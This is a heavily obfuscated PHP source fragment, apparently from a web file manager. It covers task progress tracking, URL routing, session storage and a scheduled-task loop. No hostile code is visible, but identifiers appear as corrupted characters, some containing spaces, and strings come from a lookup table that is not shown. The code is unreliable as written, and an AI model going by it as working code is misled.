$úµ•ÖÙ =& $_SERVER[÷ôÚîå]; $¾Ó±ŒğÚ = $Šé¯ğ¬¢; if ($¾Ó±ŒğÚ == $GLOBALS[$úµ•ÖÙ[1844]]) { $¾Ó±ŒğÚ = $GLOBALS[$úµ•ÖÙ[1845]]; } $GLOBALS[$úµ•ÖÙ[1845]] = $Šé¯ğ¬¢; $GLOBALS[$úµ•ÖÙ[1844]] = $ğ„î Ğ; $şÚĞÎŸ­ =& $this->task; $şÚĞÎŸ­[$úµ•ÖÙ[1830]] = $¾Ó±ŒğÚ; $şÚĞÎŸ­[$úµ•ÖÙ[1832]] = (int) $Éª‘ºİò->size($ì‚ÑÇƒö); $şÚĞÎŸ­[$úµ•ÖÙ[1833]] = 0; $şÚĞÎŸ­[$úµ•ÖÙ[1154]] = $úµ•ÖÙ[12]; $şÚĞÎŸ­[$úµ•ÖÙ[1834]] = $úµ•ÖÙ[12]; $şÚĞÎŸ­[$úµ•ÖÙ[1835]] = 0; $†õÑ‹û = $şÚĞÎŸ­[$úµ•ÖÙ[1832]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($şÚĞÎŸ­[$úµ•ÖÙ[484]] . $úµ•ÖÙ[1846]); if ($†õÑ‹û && file_exists(get_path_father($Åò•¤Úà))) { Cache::set($şÚĞÎŸ­[$úµ•ÖÙ[484]] . $úµ•ÖÙ[1846], $Åò•¤Úà); $şÚĞÎŸ­[$úµ•ÖÙ[1803]] = array($úµ•ÖÙ[1847], $úµ•ÖÙ[1848]); } $this->update(0, $†õÑ‹û); } public static function updateCopyLocalFileSize($áÌ€™í) { $·íÀü«¯ =& $_SERVER[÷ôÚîå]; $ÆÛ›ÖÓº = Cache::get($áÌ€™í[$·íÀü«¯[484]] . $·íÀü«¯[1846]); if (!$ÆÛ›ÖÓº || !file_exists($ÆÛ›ÖÓº)) { return $áÌ€™í; } $áÌ€™í[$·íÀü«¯[1833]] = @filesize($ÆÛ›ÖÓº); $áÌ€™í[$·íÀü«¯[1837]] += $áÌ€™í[$·íÀü«¯[1833]]; self::updateTask($áÌ€™í); return $áÌ€™í; } public function copyFileEnd($»²Şìº¶, $Œ¹õ×õ, $Í¬Ìäø‰, $ñ¬ó†Çº, $¾‘£“‰, $ÌÙÊøûó) { $İëÜÜ¿Ç =& $_SERVER[÷ôÚîå]; $ıŠø‘î =& $this->task; $ıŠø‘î[$İëÜÜ¿Ç[1833]] = $ıŠø‘î[$İëÜÜ¿Ç[1832]]; $ıŠø‘î[$İëÜÜ¿Ç[1834]] = $İëÜÜ¿Ç[12]; unset($ıŠø‘î[$İëÜÜ¿Ç[1803]]); if ($¾‘£“‰ == $ıŠø‘î[$İëÜÜ¿Ç[1830]]) { $ıŠø‘î[$İëÜÜ¿Ç[1836]] += $ıŠø‘î[$İëÜÜ¿Ç[1832]]; $ıŠø‘î[$İëÜÜ¿Ç[1837]] = $ıŠø‘î[$İëÜÜ¿Ç[1836]]; $é¸Üóéß = 1; if (isset($ıŠø‘î[$İëÜÜ¿Ç[1843]]) && $ıŠø‘î[$İëÜÜ¿Ç[1843]] == $Œ¹õ×õ) { $é¸Üóéß = 0; } $this->update($é¸Üóéß); } else { $this->update(); $ıŠø‘î[$İëÜÜ¿Ç[1833]] = 0; } Cache::remove($ıŠø‘î[$İëÜÜ¿Ç[484]] . $İëÜÜ¿Ç[1846]); self::log($İëÜÜ¿Ç[1849] . $Œ¹õ×õ . $İëÜÜ¿Ç[83] . $ñ¬ó†Çº . $İëÜÜ¿Ç[65] . $¾‘£“‰ . $İëÜÜ¿Ç[1850] . $ıŠø‘î[$İëÜÜ¿Ç[1830]]); } public function updateFileEnd($êĞ¼Á÷Ê, $çÆÍ‘¾) { $ÑÃ‘°¶‰ =& $_SERVER[÷ôÚîå]; $³¦ü†·í =& $this->task; $³¦ü†·í[$ÑÃ‘°¶‰[1830]] = $êĞ¼Á÷Ê; $³¦ü†·í[$ÑÃ‘°¶‰[1832]] = $çÆÍ‘¾; $³¦ü†·í[$ÑÃ‘°¶‰[1836]] += $çÆÍ‘¾; $³¦ü†·í[$ÑÃ‘°¶‰[1837]] = $³¦ü†·í[$ÑÃ‘°¶‰[1836]]; $this->update(1); self::log($ÑÃ‘°¶‰[1851] . $êĞ¼Á÷Ê); } public function sourceModelCopy($ïıÎÂÎ) { $«¦ıµ =& $_SERVER[÷ôÚîå]; $ÆÚÎ“ˆ² = $ïıÎÂÎ[0]; $«í© Íà = $ïıÎÂÎ[1]; $†ÅÁ¼¤ó =& $this->task; $this->sourceModelCopyFlag = !0; $Õ‘¬”ÙÔ = 0; switch ($ÆÚÎ“ˆ²) { case $«¦ıµ[644]: $Õ‘¬”ÙÔ = 1; break; case $«¦ıµ[647]: $†ÅÁ¼¤ó[$«¦ıµ[1830]] = $«í© Íà[$«¦ıµ[32]]; break; case $«¦ıµ[649]: $Õ‘¬”ÙÔ = intval($ïıÎÂÎ[$«¦ıµ[465]] * 0.4); break; case $«¦ıµ[651]: $Õ‘¬”ÙÔ = intval($ïıÎÂÎ[$«¦ıµ[465]] * 0.2); break; case $«¦ıµ[653]: $Õ‘¬”ÙÔ = intval($ïıÎÂÎ[$«¦ıµ[465]] * 0.4); break; } $this->update($Õ‘¬”ÙÔ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ªÌÇÅğÀ, $Ş·¶ÙñĞ) { $˜ç©µäü =& $_SERVER[÷ôÚîå]; $this->sourceModelCopyFlag = !0; $¦Ğ±“È× = 1; if (isset($ªÌÇÅğÀ[$˜ç©µäü[92]])) { $¦Ğ±“È× = $ªÌÇÅğÀ[$˜ç©µäü[92]][$˜ç©µäü[90]]; $¦Ğ±“È× = $¦Ğ±“È× + $ªÌÇÅğÀ[$˜ç©µäü[92]][$˜ç©µäü[91]] + 1; } $this->update($¦Ğ±“È×); $this->sourceModelCopyFlag = !1; } public function sourceMove($Áã¾‰) { $this->sourceRemove($Áã¾‰, !1); } public function curlProgress($«¶©¯–ë, $Ÿ¢¥Ô§â, $à£Ï†µ, $í¬€Öˆ…, $ˆ‰®ˆ»–) { $¨Çşñ =& $_SERVER[÷ôÚîå]; $ßùŒ»ÇÍ =& $this->task; if ($ˆ‰®ˆ»– > 0) { $ßùŒ»ÇÍ[$¨Çşñ[1154]] = $¨Çşñ[1852]; $ßùŒ»ÇÍ[$¨Çşñ[1834]] = $¨Çşñ[120]; if ($ßùŒ»ÇÍ[$¨Çşñ[1832]]) { $ßùŒ»ÇÍ[$¨Çşñ[1833]] = $ˆ‰®ˆ»–; } if ($ßùŒ»ÇÍ[$¨Çşñ[1835]]) { $ßùŒ»ÇÍ[$¨Çşñ[1833]] = $ˆ‰®ˆ»– + $ßùŒ»ÇÍ[$¨Çşñ[1835]]; } } else { if ($à£Ï†µ > 0) { if ($ßùŒ»ÇÍ[$¨Çşñ[1832]] == $Ÿ¢¥Ô§â) { $ßùŒ»ÇÍ[$¨Çşñ[1833]] = $à£Ï†µ; $ßùŒ»ÇÍ[$¨Çşñ[1154]] = $¨Çşñ[1853]; $ßùŒ»ÇÍ[$¨Çşñ[1834]] = $¨Çşñ[1290]; } } } $this->update(); } public function curlProgressStart($¥Õ¸Ò–¹) { } public function curlProgressEnd($¶ä¥Òƒ¬) { $ñ–¯»’ =& $_SERVER[÷ôÚîå]; $Ï©é×†Œ =& $this->task; $³Âé—°£ = curl_getinfo($¶ä¥Òƒ¬); $·â­˜é© = $³Âé—°£[$ñ–¯»’[1854]]; if ($·â­˜é© == -1) { $·â­˜é© = $³Âé—°£[$ñ–¯»’[1855]]; } if ($Ï©é×†Œ[$ñ–¯»’[1834]] == $ñ–¯»’[120] && $·â­˜é©) { $Ï©é×†Œ[$ñ–¯»’[1835]] += $·â­˜é©; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ş«À¾À =& $_SERVER[÷ôÚîå]; $û‡ö”ŠŠ =& $this->task; $û‡ö”ŠŠ[$ş«À¾À[1856]] = 1; Hook::bind($ş«À¾À[1824], array($this, $ş«À¾À[1857])); Hook::bind($ş«À¾À[1826], array($this, $ş«À¾À[1858])); Hook::bind($ş«À¾À[1828], array($this, $ş«À¾À[1859])); } protected function endAfter() { $§ÖÃ°²ß =& $_SERVER[÷ôÚîå]; Hook::unbind($§ÖÃ°²ß[1824], array($this, $§ÖÃ°²ß[1857])); Hook::unbind($§ÖÃ°²ß[1826], array($this, $§ÖÃ°²ß[1858])); Hook::unbind($§ÖÃ°²ß[1828], array($this, $§ÖÃ°²ß[1859])); } public function progressStart($»–Ù”†Ö) { $ıÜ­ŸØ¿ =& $_SERVER[÷ôÚîå]; $ßÕß”€¯ = curl_getinfo($»–Ù”†Ö); self::log($ıÜ­ŸØ¿[1860] . $ßÕß”€¯[$ıÜ­ŸØ¿[392]]); self::valueSet($this->task[$ıÜ­ŸØ¿[484]], $this->task); } public function progressEnd($°Œ¹°ò‹) { $²·ÇÂë­ =& $_SERVER[÷ôÚîå]; self::log($²·ÇÂë­[1861] . $this->task[$²·ÇÂë­[484]]); $this->end(); } public function progress($¦–íÃ›Ê, $ßˆ÷Êı™, $°Œœ­àØ, $æëØç÷ä, $‘üè–ÜŸ) { $×†ìôÃû =& $_SERVER[÷ôÚîå]; $ã”‹©ô =& $this->task; if ($‘üè–ÜŸ > 0) { $ã”‹©ô[$×†ìôÃû[1152]] = $ã”‹©ô[$×†ìôÃû[1152]] == 0 ? $æëØç÷ä : $ã”‹©ô[$×†ìôÃû[1152]]; $ã”‹©ô[$×†ìôÃû[1780]] = $‘üè–ÜŸ; } else { if ($°Œœ­àØ > 0) { $ã”‹©ô[$×†ìôÃû[1152]] = $ã”‹©ô[$×†ìôÃû[1152]] == 0 ? $ßˆ÷Êı™ : $ã”‹©ô[$×†ìôÃû[1152]]; $ã”‹©ô[$×†ìôÃû[1780]] = $°Œœ­àØ; } } $this->update(); self::log("\x70\162\157\x67\x72\x65\x73\163\x48\164\x74\x70\72\x64\157\167\x6e\x3a{$°Œœ­àØ}\x2f{$ßˆ÷Êı™}\x3b\40\x75\x70\x6c\157\x61\144\x3a{$‘üè–ÜŸ}\57{$æëØç÷ä}\x3b"); } } goto cƒ¾ŠŞÇÜ; dÒ‚÷Ïí¶: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\x5e\57\x5d\x2b", "\x3a\x6e\165\155" => "\x5b\x30\55\x39\135\x2b", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($éâÛˆ¤À, $êƒãó±) { $ìÖû¤í =& $_SERVER[÷ôÚîå]; if ($éâÛˆ¤À == $ìÖû¤í[1715]) { $Û¼ñÆ = array_map($ìÖû¤í[1716], $êƒãó±[0]); $Ñï«î›ç = strpos($êƒãó±[1], $ìÖû¤í[8]) === 0 ? $êƒãó±[1] : $ìÖû¤í[8] . $êƒãó±[1]; $“ù¾üí‘ = $êƒãó±[2]; } else { $Û¼ñÆ = null; $Ñï«î›ç = strpos($êƒãó±[0], $ìÖû¤í[8]) === 0 ? $êƒãó±[0] : $ìÖû¤í[8] . $êƒãó±[0]; $“ù¾üí‘ = $êƒãó±[1]; } array_push(self::$maps, $Û¼ñÆ); array_push(self::$routes, $Ñï«î›ç); array_push(self::$methods, strtoupper($éâÛˆ¤À)); array_push(self::$callbacks, $“ù¾üí‘); } public static function error($ºÆ«”‘) { self::$errorCallback = $ºÆ«”‘; } public static function haltOnMatch($Œ’‡ÚÎš = true) { self::$halts = $Œ’‡ÚÎš; } public static function dispatch() { $Š¯áâ­ =& $_SERVER[÷ôÚîå]; $‚ºÖæÆ‰ = parse_url($_SERVER[$Š¯áâ­[1717]], PHP_URL_PATH); $ø†ÁßÒÈ = $_SERVER[$Š¯áâ­[174]]; $¦œ¦î­ = array_keys(static::$patterns); $î÷Û–ëƒ = array_values(static::$patterns); $Ğ†¢æ°ë = !1; self::$routes = preg_replace($Š¯áâ­[1372], $Š¯áâ­[8], self::$routes); if (in_array($‚ºÖæÆ‰, self::$routes)) { $ı²Ô = array_keys(self::$routes, $‚ºÖæÆ‰); foreach ($ı²Ô as $Şıšû³‡) { if (self::$methods[$Şıšû³‡] == $ø†ÁßÒÈ || self::$methods[$Şıšû³‡] == $Š¯áâ­[1718] || in_array($ø†ÁßÒÈ, self::$maps[$Şıšû³‡])) { $Ğ†¢æ°ë = !0; if (!is_object(self::$callbacks[$Şıšû³‡])) { $™Å“Ïöõ = explode($Š¯áâ­[8], self::$callbacks[$Şıšû³‡]); $ ÜŒÔšÚ = end($™Å“Ïöõ); $ÀĞÔöÚ’ = explode($Š¯áâ­[1304], $ ÜŒÔšÚ); $Ñğ½ÜçŠ = new $ÀĞÔöÚ’[0](); $Ñğ½ÜçŠ->{$ÀĞÔöÚ’[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Şıšû³‡]); if (self::$halts) { return; } } } } } else { $™ÛØ¨âã = 0; foreach (self::$routes as $Şıšû³‡) { if (strpos($Şıšû³‡, $Š¯áâ­[4]) !== !1) { $Şıšû³‡ = str_replace($¦œ¦î­, $î÷Û–ëƒ, $Şıšû³‡); } if (preg_match($Š¯áâ­[1719] . $Şıšû³‡ . $Š¯áâ­[1720], $‚ºÖæÆ‰, $ğËÖ•Í )) { if (self::$methods[$™ÛØ¨âã] == $ø†ÁßÒÈ || self::$methods[$™ÛØ¨âã] == $Š¯áâ­[1718] || !empty(self::$maps[$™ÛØ¨âã]) && in_array($ø†ÁßÒÈ, self::$maps[$™ÛØ¨âã])) { $Ğ†¢æ°ë = !0; array_shift($ğËÖ•Í ); if (!is_object(self::$callbacks[$™ÛØ¨âã])) { $™Å“Ïöõ = explode($Š¯áâ­[8], self::$callbacks[$™ÛØ¨âã]); $ ÜŒÔšÚ = end($™Å“Ïöõ); $ÀĞÔöÚ’ = explode($Š¯áâ­[1304], $ ÜŒÔšÚ); $Ñğ½ÜçŠ = new $ÀĞÔöÚ’[0](); if (!method_exists($Ñğ½ÜçŠ, $ÀĞÔöÚ’[1])) { echo $Š¯áâ­[1721]; } else { call_user_func_array(array($Ñğ½ÜçŠ, $ÀĞÔöÚ’[1]), $ğËÖ•Í ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$™ÛØ¨âã], $ğËÖ•Í ); if (self::$halts) { return; } } } } $™ÛØ¨âã++; } } if ($Ğ†¢æ°ë == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ú¸ö¨“˜ =& $_SERVER[÷ôÚîå]; header($_SERVER[$ú¸ö¨“˜[1722]] . $ú¸ö¨“˜[1723]); echo $ú¸ö¨“˜[1724]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Š¯áâ­[1717]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $½ãÀÙÆÃ =& $_SERVER[÷ôÚîå]; static $Ôî¾•Ùı = false; if ($Ôî¾•Ùı) { return $Ôî¾•Ùı; } $°…ÂÈâÆ = $GLOBALS[$½ãÀÙÆÃ[6]][$½ãÀÙÆÃ[434]]; self::$sessionTime = $°…ÂÈâÆ[$½ãÀÙÆÃ[1725]]; $ÉÂ²¡ŸÛ = isset($GLOBALS[$½ãÀÙÆÃ[1726]]) ? $GLOBALS[$½ãÀÙÆÃ[1726]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÉÂ²¡ŸÛ)) { self::$sessionSign = Cookie::get($ÉÂ²¡ŸÛ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÉÂ²¡ŸÛ, self::$sessionSign, self::$sessionTime); $è‰œóÁƒ = $°…ÂÈâÆ[$½ãÀÙÆÃ[1727]]; $«ŒÁÚòâ = $°…ÂÈâÆ[$è‰œóÁƒ]; $ºƒ‹ó§ã = $°…ÂÈâÆ[$½ãÀÙÆÃ[917]]; switch ($è‰œóÁƒ) { case $½ãÀÙÆÃ[21]: self::$handle = Model($½ãÀÙÆÃ[918]); break; case $½ãÀÙÆÃ[919]: self::$handle = new CacheRedis($«ŒÁÚòâ, $ºƒ‹ó§ã); break; case $½ãÀÙÆÃ[920]: self::$handle = new CacheMemcached($«ŒÁÚòâ, $ºƒ‹ó§ã); break; case $½ãÀÙÆÃ[240]: $«ŒÁÚòâ[$½ãÀÙÆÃ[97]] = $«ŒÁÚòâ[$½ãÀÙÆÃ[97]] . $½ãÀÙÆÃ[1728]; self::$handle = new CacheFile($«ŒÁÚòâ, $ºƒ‹ó§ã); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ôî¾•Ùı = new self(); return $Ôî¾•Ùı; } public static function getBySign($„’³ñ•Ğ) { $Û²åÖº = self::$handle->get($„’³ñ•Ğ); $Û²åÖº = unserialize($Û²åÖº); return is_array($Û²åÖº) ? $Û²åÖº : array(); } public static function setBySign($ŸùÎøª, $Å¸Ôº°Ğ) { CacheLock::lock($ŸùÎøª); self::$handle->set($ŸùÎøª, serialize($Å¸Ôº°Ğ), self::$sessionTime); CacheLock::unlock($ŸùÎøª); } public static function sign($•…»¤ı¹ = false) { if ($•…»¤ı¹) { self::$sessionSign = $•…»¤ı¹; } self::init(); return self::$sessionSign; } public static function set($—¶œ­÷ˆ, $í‡ºèÍŒ = false) { self::init(); if (is_array($—¶œ­÷ˆ)) { foreach ($—¶œ­÷ˆ as $’Ğ¥¬ãß => $³æó®Ï¥) { array_set_value(self::$data, $’Ğ¥¬ãß, $³æó®Ï¥); } } else { array_set_value(self::$data, $—¶œ­÷ˆ, $í‡ºèÍŒ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÔŒ²¡ä = false) { self::init(); if (!$ÔŒ²¡ä) { return self::$data; } return array_get_value(self::$data, $ÔŒ²¡ä); } public static function remove($÷½ØËŠ) { self::init(); unset(self::$data[$÷½ØËŠ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[÷ôÚîå][923])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¶“¢ˆóË =& $_SERVER[÷ôÚîå]; if (self::valueGet($¶“¢ˆóË[839]) != $¶“¢ˆóË[101]) { return; } if (self::valueGet($¶“¢ˆóË[1729]) == $¶“¢ˆóË[101]) { $‘îÙ«íÎ = self::valueGet($¶“¢ˆóË[1730]); if (time() - $‘îÙ«íÎ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¶“¢ˆóË[1729], $¶“¢ˆóË[101]); self::log($¶“¢ˆóË[1731] . ACTION . $¶“¢ˆóË[1732]); Hook::bind($¶“¢ˆóË[1733], $¶“¢ˆóË[1734]); $ñí©ò–Ö = 0; while (!0) { self::cacheClear(); if (self::valueGet($¶“¢ˆóË[839]) != $¶“¢ˆóË[101]) { self::valueSet($¶“¢ˆóË[1729], $¶“¢ˆóË[238]); self::log($¶“¢ˆóË[1735]); die; } $üÍˆ³ü§ = time(); if ($üÍˆ³ü§ - $ñí©ò–Ö >= 60) { self::valueSet(array($¶“¢ˆóË[1729] => $¶“¢ˆóË[101], $¶“¢ˆóË[1730] => $üÍˆ³ü§)); $ñí©ò–Ö = $üÍˆ³ü§; } if (!file_exists(USER_SYSTEM . $¶“¢ˆóË[1736])) { self::valueSet(array($¶“¢ˆóË[1729] => $¶“¢ˆóË[238], $¶“¢ˆóË[839] => $¶“¢ˆóË[238])); self::log($¶“¢ˆóË[1737]); die; } $Ş˜â‰úğ = file_get_contents(BASIC_PATH . $¶“¢ˆóË[1738]); $ãü™û®Ó = KOD_VERSION . $¶“¢ˆóË[10] . KOD_VERSION_BUILD; $€Ğ÷äöÒ = match_text($Ş˜â‰úğ, $¶“¢ˆóË[1739]) . $¶“¢ˆóË[10] . match_text($Ş˜â‰úğ, $¶“¢ˆóË[1740]); if ($€Ğ÷äöÒ != $ãü™û®Ó) { self::restart(); self::log("\163\x74\157\x70\x65\144\56\x5b\166\x65\162\163\151\x6f\156\x20\x75\x70\144\141\x74\145\x3b{$versionNow}\x20\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $šôçÃÒ… =& $_SERVER[÷ôÚîå]; http_close(); $GLOBALS[$šôçÃÒ…[1741]] = 1; $_SERVER[$šôçÃÒ…[1742]] = $šôçÃÒ…[1743]; $_COOKIE = array(); $GLOBALS[$šôçÃÒ…[1744]] = 1; $GLOBALS[$šôçÃÒ…[1745]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $”å£ªê =& $_SERVER[÷ôÚîå]; http_close(); self::valueSet($”å£ªê[839], $”å£ªê[238]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($”å£ªê[1729] => $”å£ªê[238], $”å£ªê[839] => $”å£ªê[101])); self::log($”å£ªê[1746]); } public static function taskSwitch() { $ÒÂöø© =& $_SERVER[÷ôÚîå]; $ı°Ì† = self::valueGet($ÒÂöø©[839]) == $ÒÂöø©[101] ? $ÒÂöø©[238] : $ÒÂöø©[101]; self::valueSet($ÒÂöø©[839], $ı°Ì†); } public static function shutdownEvent() { $»¶ÒÅ˜Ê =& $_SERVER[÷ôÚîå]; self::valueSet($»¶ÒÅ˜Ê[1729], $»¶ÒÅ˜Ê[238]); self::log($»¶ÒÅ˜Ê[1747]); } public static function config($¦˜ë¨’, $İõİĞ‡Ê) { self::valueSet($_SERVER[÷ôÚîå][839], $¦˜ë¨’); } private static function taskRunAll() { $é¡Í”âÅ =& $_SERVER[÷ôÚîå]; $íŸ°¢ã = timeFloat(); $ªÄìÒÜ = Model($é¡Í”âÅ[1748])->listData(); $øÔºí• = count($ªÄìÒÜ); for ($è©Ú¡Ş = 0; $è©Ú¡Ş < $øÔºí•; $è©Ú¡Ş++) { $ÅêğËìØ = $ªÄìÒÜ[$è©Ú¡Ş]; if (!$ÅêğËìØ[$é¡Í”âÅ[484]] || $ÅêğËìØ[$é¡Í”âÅ[1749]] != $é¡Í”âÅ[101]) { continue; } if (!self::taskTimeCheck($ÅêğËìØ)) { continue; } self::taskRun($ÅêğËìØ); } Hook::trigger($é¡Í”âÅ[1750]); self::taskQueueRun($íŸ°¢ã); } private static function taskQueueRun($§Ïêû÷ñ) { $ëÓªÆ×Á = 10; while (!0) { $ºõò´Øş = TaskQueue::run(); if ($ºõò´Øş === !1) { break; } if (timeFloat() - $§Ïêû÷ñ >= $ëÓªÆ×Á) { break; } } } private static function taskTimeCheck($¯ˆ¯Üüô) { $ì´î„­• =& $_SERVER[÷ôÚîå]; $İÜÆïó = json_decode($¯ˆ¯Üüô[$ì´î„­•[216]], !0); $…‚âáß¬ = intval($¯ˆ¯Üüô[$ì´î„­•[1730]]); $»©ïñ = strtotime($ì´î„­•[1751] . $İÜÆïó[$ì´î„­•[1752]] . $ì´î„­•[1753]) - strtotime($ì´î„­•[1754]); $Ş±¡©Å³ = time() - strtotime(date($ì´î„­•[1755]) . $ì´î„­•[1756]); $Óˆñôø© = $Ş±¡©Å³ >= $»©ïñ && $Ş±¡©Å³ <= $»©ïñ + 3600; switch ($İÜÆïó[$ì´î„­•[33]]) { case $ì´î„­•[1757]: if (time() - $…‚âáß¬ < 3600 * 24 * 30) { return !1; } if ($İÜÆïó[$ì´î„­•[1757]] == date($ì´î„­•[1758]) && $Óˆñôø©) { return !0; } break; case $ì´î„­•[1759]: if (time() - $…‚âáß¬ < 3600 * 24 * 7) { return !1; } $š¬›Å´ç = date($ì´î„­•[1760]) == 0 ? 7 : date($ì´î„­•[1760]); if ($İÜÆïó[$ì´î„­•[1759]] == $š¬›Å´ç && $Óˆñôø©) { return !0; } break; case $ì´î„­•[1752]: if (time() - $…‚âáß¬ < 3600 * 24) { return !1; } if ($Óˆñôø©) { return !0; } break; case $ì´î„­•[1761]: if (time() - $…‚âáß¬ >= floatval($İÜÆïó[$ì´î„­•[1761]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ú°ïç”Ö =& $_SERVER[÷ôÚîå]; static $® Ö½ƒÙ = 0; $ÉëÔàõ€ = 300; if (!$® Ö½ƒÙ) { $® Ö½ƒÙ = time(); } if (time() - $® Ö½ƒÙ < $ÉëÔàõ€) { return; } $® Ö½ƒÙ = time(); $‚¯Úè©¨ = Model($ú°ïç”Ö[586])->db($ú°ïç”Ö[12]); if ($‚¯Úè©¨) { $‚¯Úè©¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ú°ïç”Ö[1762], $ú°ïç”Ö[1763]); die; } } public static function taskRun($ÎÅŠ½ÙĞ) { $Èò¹˜” =& $_SERVER[÷ôÚîå]; self::log($Èò¹˜”[1764] . $ÎÅŠ½ÙĞ[$Èò¹˜”[484]] . $Èò¹˜”[1765] . $ÎÅŠ½ÙĞ[$Èò¹˜”[32]] . $Èò¹˜”[1766] . $ÎÅŠ½ÙĞ[$Èò¹˜”[1767]]); Model($Èò¹˜”[1748])->run($ÎÅŠ½ÙĞ[$Èò¹˜”[484]]); $áÒ¥•À = timeFloat(); $Á›´î£˜ = $Èò¹˜”[12]; switch ($ÎÅŠ½ÙĞ[$Èò¹˜”[33]]) { case $Èò¹˜”[392]: $µ™—œØà = url_request($ÎÅŠ½ÙĞ[$Èò¹˜”[1767]], $Èò¹˜”[271], !1, !1, !1, !1, 10); if ($µ™—œØà[$Èò¹˜”[839]]) { $Á›´î£˜ = strlen($µ™—œØà[$Èò¹˜”[1298]]); } break; case $Èò¹˜”[270]: $Á›´î£˜ = Hook::apply($ÎÅŠ½ÙĞ[$Èò¹˜”[1767]]); default: break; } Model($Èò¹˜”[1768])->add(array($Èò¹˜”[1769] => $Èò¹˜”[12], $Èò¹˜”[1770] => $Èò¹˜”[238], $Èò¹˜”[33] => $Èò¹˜”[1771] . $ÎÅŠ½ÙĞ[$Èò¹˜”[484]], $Èò¹˜”[1772] => json_encode(array($Èò¹˜”[32] => $ÎÅŠ½ÙĞ[$Èò¹˜”[32]], $Èò¹˜”[1773] => timeFloat() - $áÒ¥•À, $Èò¹˜”[378] => $Á›´î£˜)))); $»¡˜™º™ = $Á›´î£˜ ? $Èò¹˜”[1774] . $Á›´î£˜ : $Èò¹˜”[12]; self::log($Èò¹˜”[1775] . $ÎÅŠ½ÙĞ[$Èò¹˜”[484]] . $Èò¹˜”[188] . $»¡˜™º™); return !0; } public static function valueGet($Şş³¢ØÛ) { $÷àšŒÕ‡ =& $_SERVER[÷ôÚîå]; $ƒ²ãê = $÷àšŒÕ‡[1776]; $ø“æ•¥ = Model($÷àšŒÕ‡[517])->get($Şş³¢ØÛ, $ƒ²ãê); if (is_null($ø“æ•¥)) { Model($÷àšŒÕ‡[517])->set($÷àšŒÕ‡[839], $÷àšŒÕ‡[101], $ƒ²ãê); Model($÷àšŒÕ‡[517])->set($÷àšŒÕ‡[1729], $÷àšŒÕ‡[238], $ƒ²ãê); $ø“æ•¥ = Model($÷àšŒÕ‡[517])->get($Şş³¢ØÛ, $ƒ²ãê); } return $ø“æ•¥; } private static function valueSet($®Áşéã÷, $¼‚Üºò¸ = false) { $çı¼¼ô =& $_SERVER[÷ôÚîå]; $ÒÒœ“Âà = $çı¼¼ô[1777]; CacheLock::lock($ÒÒœ“Âà); $û¸ÑÓüà = Model($çı¼¼ô[517])->set($®Áşéã÷, $¼‚Üºò¸, $çı¼¼ô[1776]); CacheLock::unlock($ÒÒœ“Âà); return $û¸ÑÓüà; } protected static function log($‹ğß¡Ñ) { write_log($‹ğß¡Ñ, $_SERVER[÷ôÚîå][1763]); } private static function cacheClear() { $Ë®á‡¢÷ =& $_SERVER[÷ôÚîå]; Cache::clearMemory(Model($Ë®á‡¢÷[517])->cacheKey($Ë®á‡¢÷[1776])); Cache::clearMemory(Model($Ë®á‡¢÷[517])->cacheKey($Ë®á‡¢÷[1778])); Model($Ë®á‡¢÷[1748])->cacheClear(); self::closeDatabase(); } } goto bå‡šì·âœ; E±èÇ·•‰: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\143\145\x5f\150\x69\x73\x74\157\x72\171"; public function historyCount($•š…£³) { $Ó¤öŠÚ =& $_SERVER[÷ôÚîå]; if (!$•š…£³) { return array(); } if (is_string($•š…£³) || is_int($•š…£³)) { $•š…£³ = array($•š…£³); } $ˆ“¢½ö = array($Ó¤öŠÚ[203], $Ó¤öŠÚ[2011] => $Ó¤öŠÚ[574]); $Îº†Î = array($Ó¤öŠÚ[203] => array($Ó¤öŠÚ[7], $•š…£³)); $˜ıÈå”ù = $this->field($ˆ“¢½ö)->where($Îº†Î)->group($Ó¤öŠÚ[203])->select(); return array_to_keyvalue($˜ıÈå”ù, $Ó¤öŠÚ[203], $Ó¤öŠÚ[574]); } public function addHistory($ş¡ÄøÛ, $ ²ùˆ„û = '') { $µ¯ä¡ =& $_SERVER[÷ôÚîå]; $ô½ô¾ù  = array($µ¯ä¡[500] => $ş¡ÄøÛ[$µ¯ä¡[203]], $µ¯ä¡[1770] => isset($ş¡ÄøÛ[$µ¯ä¡[538]]) ? $ş¡ÄøÛ[$µ¯ä¡[538]] : $ş¡ÄøÛ[$µ¯ä¡[536]], $µ¯ä¡[551] => $ş¡ÄøÛ[$µ¯ä¡[550]], $µ¯ä¡[626] => $ş¡ÄøÛ[$µ¯ä¡[89]], $µ¯ä¡[2228] 